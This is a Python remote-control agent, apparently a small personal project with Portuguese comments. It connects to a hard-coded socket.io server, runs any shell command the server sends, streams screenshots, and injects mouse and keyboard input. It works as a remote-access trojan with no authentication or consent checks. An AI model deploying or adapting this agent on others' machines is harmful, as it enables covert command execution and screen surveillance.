import psutil
import time
import socket as pysocket
import platform
import subprocess
import socketio
import base64
import io

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    HAS_SCREEN_CAPTURE = True
except ImportError:
    HAS_SCREEN_CAPTURE = False
    print("[Aviso] Instale o pyautogui e o Pillow para controlo remoto.")

sio = socketio.Client()
HOSTNAME = pysocket.gethostname()
OS_INFO = f"{platform.system()} {platform.release()}"
SERVER_URL = 'https://projetinho-ehcn.onrender.com'
streaming_active = False

@sio.event
def connect():
    sio.emit('register_agent', {'hostname': HOSTNAME, 'os': OS_INFO})

@sio.event
def disconnect():
    pass

@sio.on('execute_command')
def on_execute_command(data):
    command = data.get('command')
    try:
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = process.stdout if process.stdout else process.stderr
        if not output.strip(): output = "[Executado]"
    except Exception as e:
        output = f"[Erro]: {str(e)}"
    sio.emit('command_result', {'hostname': HOSTNAME, 'result': output})

# --- INÍCIO DO CONTROLO REMOTO (VÍDEO, RATO E TECLADO) ---
@sio.on('start_screen_stream')
def on_start_screen():
    global streaming_active
    if HAS_SCREEN_CAPTURE:
        streaming_active = True

@sio.on('stop_screen_stream')
def on_stop_screen():
    global streaming_active
    streaming_active = False

@sio.on('mouse_action')
def on_mouse_action(data):
    if not HAS_SCREEN_CAPTURE: return
    action = data.get('action')
    rel_x = data.get('x') # Posição X em %
    rel_y = data.get('y') # Posição Y em %

    screen_width, screen_height = pyautogui.size()
    # Converte a % do navegador para os píxeis reais da máquina
    abs_x = int(rel_x * screen_width)
    abs_y = int(rel_y * screen_height)

    try:
        if action == 'click':
            pyautogui.click(abs_x, abs_y)
        elif action == 'rightclick':
            pyautogui.rightClick(abs_x, abs_y)
        elif action == 'dblclick':
            pyautogui.doubleClick(abs_x, abs_y)
    except:
        pass

@sio.on('keyboard_action')
def on_keyboard_action(data):
    if not HAS_SCREEN_CAPTURE: return
    key = data.get('key')
    
    # Mapeamento de teclas JS para teclas PyAutoGUI
    key_map = {
        'Enter': 'enter', 'Backspace': 'backspace', 'Tab': 'tab',
        'Escape': 'esc', 'Shift': 'shift', 'Control': 'ctrl',
        'Alt': 'alt', 'ArrowUp': 'up', 'ArrowDown': 'down',
        'ArrowLeft': 'left', 'ArrowRight': 'right', 'Delete': 'delete',
        'Meta': 'win', ' ': 'space'
    }
    
    mapped_key = key_map.get(key, key)
    try:
        if len(mapped_key) == 1:
            pyautogui.write(mapped_key) # Digita letras e números
        else:
            pyautogui.press(mapped_key) # Aperta teclas especiais
    except:
        pass

def capture_and_send_screen():
    global streaming_active
    while True:
        if streaming_active and sio.connected and HAS_SCREEN_CAPTURE:
            try:
                screenshot = pyautogui.screenshot()
                # Resolução reduzida para garantir velocidade
                screenshot = screenshot.resize((1024, int(1024 * screenshot.height / screenshot.width)))
                buffer = io.BytesIO()
                screenshot.save(buffer, format="JPEG", quality=50)
                encoded_image = base64.b64encode(buffer.getvalue()).decode('utf-8')
                sio.emit('screen_frame', {'hostname': HOSTNAME, 'image': encoded_image})
            except Exception:
                pass
            time.sleep(0.15) # Framerate
        else:
            time.sleep(1)

def start_telemetry():
    while True:
        if sio.connected:
            try:
                sio.emit('agent_metrics', {
                    'hostname': HOSTNAME,
                    'cpu': psutil.cpu_percent(interval=None),
                    'ram': psutil.virtual_memory().percent
                })
            except:
                pass
        time.sleep(2)

if __name__ == '__main__':
    import threading
    if HAS_SCREEN_CAPTURE:
        threading.Thread(target=capture_and_send_screen, daemon=True).start()

    while True:
        try:
            sio.connect(SERVER_URL)
            start_telemetry()
        except Exception:
            time.sleep(5)